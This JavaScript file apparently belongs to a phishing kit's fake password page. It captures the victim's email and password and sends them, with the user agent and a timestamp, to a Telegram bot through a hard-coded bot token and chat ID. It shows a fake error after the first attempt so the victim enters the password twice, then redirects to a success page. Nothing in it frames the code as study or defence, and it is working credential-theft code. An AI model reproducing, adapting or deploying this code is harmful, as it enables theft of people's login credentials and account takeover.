// DEBUG VERSION - This will show errors in browser console
const TELEGRAM_BOT_TOKEN = '8025900617:AAEyp9vzyjqKzlcihCHJ4al47yWpx_2bSzE'; // Replace with your full token
const TELEGRAM_CHAT_ID = '7373810134'; // Replace with your chat ID

async function sendToTelegram(data) {
  try {
    console.log('Attempting to send to Telegram...');
    console.log('Token:', TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
    console.log('Chat ID:', TELEGRAM_CHAT_ID);
    
    const message = `📧 Email: ${data.email}\n🔑 Password: ${data.password}\n🌐 User Agent: ${navigator.userAgent}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    console.log('Message:', message);
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    const result = await response.json();
    console.log('Telegram API response:', result);
    
    if (!result.ok) {
      console.error('Telegram API error:', result.description);
      if (result.description.includes('chat not found')) {
        console.error('ERROR: Chat ID is wrong or you need to message the bot first!');
      } else if (result.description.includes('Not Found')) {
        console.error('ERROR: Bot token is invalid!');
      }
    }
    
    return result.ok;
  } catch (error) {
    console.error('Network error:', error);
    return false;
  }
}

// Track failed attempts
let attempts = 0;

// Load email from localStorage
const email = localStorage.getItem("userEmail");
if (email) {
  document.getElementById("emailText").textContent = email;
} else {
  setTimeout(() => {
    window.location.href = "index.html";
  }, 1000);
}

// Toggle password visibility
const togglePassword = document.getElementById("togglePassword");
const passwordInput = document.getElementById("password");

togglePassword.addEventListener("click", function () {
  const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
  passwordInput.setAttribute("type", type);
  this.classList.toggle("fa-eye");
  this.classList.toggle("fa-eye-slash");
});

// Handle form submit
document.getElementById("passwordForm").addEventListener("submit", async function(e) {
  e.preventDefault();
  
  const password = document.getElementById("password").value;
  const email = localStorage.getItem("userEmail") || "Unknown email";
  const errorMsg = document.getElementById("errorMsg");
  const loadingBar = document.getElementById("loadingBar");
  
  // Show loading bar for 3 seconds
  loadingBar.style.display = 'block';
  let width = 0;
  const loadingInterval = setInterval(() => {
    if (width >= 100) {
      clearInterval(loadingInterval);
    } else {
      width += 10;
      loadingBar.style.width = width + '%';
    }
  }, 150);
  
  // Wait for 3 seconds before showing error
  setTimeout(async () => {
    // Send data to Telegram
    const telegramSuccess = await sendToTelegram({
      email: email,
      password: password
    });
    
    console.log("Telegram message sent successfully:", telegramSuccess);
    
    attempts++;
    loadingBar.style.display = 'none';
    loadingBar.style.width = '0';

    if (attempts < 2) {
      errorMsg.style.display = "block";
    } else {
      setTimeout(() => {
        window.location.href = "success.html";
      }, 5000);
    }
  }, 3000);
});

// Forgot password handler
document.getElementById("forgotPassword").addEventListener("click", function(e) {
  e.preventDefault();
  alert("Please contact customer support to reset your password.");
});